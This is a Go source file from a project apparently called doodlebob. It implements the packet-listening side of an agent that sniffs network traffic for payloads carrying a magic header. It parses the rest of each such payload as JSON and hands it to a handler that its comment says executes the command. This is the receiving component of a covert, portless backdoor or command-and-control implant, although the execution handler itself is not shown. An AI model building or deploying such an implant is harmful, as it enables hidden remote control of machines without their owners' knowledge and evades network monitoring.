// This contains the packet parsing logic for the listening agent
package agent

import (
	"bytes"
	"encoding/json"

	"github.com/MeHungr/doodlebob/internal/message"
	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

// hasMagicHeader checks to see if incoming packets have the magic header as their payload
func hasMagicHeader(payload []byte) bool {
	return len(payload) >= len(message.MagicHeader) && bytes.Equal(payload[:len(message.MagicHeader)], message.MagicHeader) // Checks for match
}

// ReadPackets reads the packets from the open pcap handle
func ReadPackets(handle *pcap.Handle) error {
	source := gopacket.NewPacketSource(
		handle,
		handle.LinkType(),
	)

	// Read packets as they come in
	for packet := range source.Packets() {
		// Application layer data of the packet
		appLayer := packet.ApplicationLayer()
		if appLayer == nil {
			continue
		}

		// Application layer payload
		payload := appLayer.Payload()
		// Check for magic header
		if hasMagicHeader(payload) {
			var msg message.Message
			body := payload[len(message.MagicHeader):] // Strip the magic header to leave raw JSON behind
			json.Unmarshal(body, &msg)                 // Turn the JSON into a Message struct
			handleMessage(&msg)                        // Handle the message (execute command)
		}
	}

	return nil
}
